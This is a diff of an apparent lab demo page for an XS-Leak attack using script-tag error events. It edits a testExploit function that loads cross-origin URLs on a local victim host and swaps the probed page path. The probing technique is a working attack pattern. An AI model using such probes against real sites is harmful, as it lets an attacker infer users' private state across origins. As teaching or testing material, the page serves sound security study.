@@ -7,14 +7,8 @@
     <title>XS-Leak Attack - Error Events</title>
     <script>
         function testExploit(url) {
-            // Create and append an iframe
             const script = document.createElement('script');
             script.src = url;
-
-            script.onload = () => {
-                console.log("Attempt to load data from\n '" + url + "' \nwas successful.");
-            }
-
             document.body.appendChild(script);
         }
     </script>
@@ -43,9 +37,9 @@
     </p>
 
     <h3>Non-Existing Webpage</h3>
-    <p>This will check whether <a href="http://victim.local:8080/xs-leaks/404">this</a> webpage is available (it is not).</p>
+    <p>This will check whether <a href="http://victim.local:8080/xs-leaks/missing-page.html">this</a> webpage is available (it is not).</p>
     <p>
-        <button onclick="testExploit('http\:\/\/victim.local:8080/xs-leaks/404')">Test Non-Existing Page (Failure)</button>
+        <button onclick="testExploit('http\:\/\/victim.local:8080/xs-leaks/missing-page.html')">Test Non-Existing Page (Failure)</button>
     </p>
 
     <div id="message"></div>
